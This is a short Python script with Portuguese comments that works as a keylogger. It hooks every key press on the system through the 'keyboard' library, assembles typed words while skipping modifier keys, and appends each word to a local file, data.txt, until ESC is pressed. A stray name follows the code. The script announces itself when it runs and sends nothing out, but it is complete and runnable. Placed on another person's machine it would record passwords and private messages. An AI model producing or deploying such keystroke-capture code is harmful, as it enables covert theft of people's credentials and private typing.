import keyboard

ARQUIVO = "data.txt"
IGNORAR = {"shift", "ctrl", "alt", "alt gr", "caps lock", "tab", "enter", "esc", "backspace"}

palavra_atual = ""  # guarda a palavra enquanto é digitada

def salvar(event):
    global palavra_atual
    if event.name in IGNORAR:
        return
    if event.name == "space":
        if palavra_atual:  # só salva se tiver algo
            with open(ARQUIVO, "a") as f:
                f.write(palavra_atual + "\n")
            palavra_atual = ""  # zera a palavra
    else:
        palavra_atual += event.name  # adiciona letra à palavra

# Ativar captura de todas as teclas
keyboard.on_press(salvar)

print("📌 Capturando palavras... (aperte ESC para sair)")
keyboard.wait("esc")



sergio 
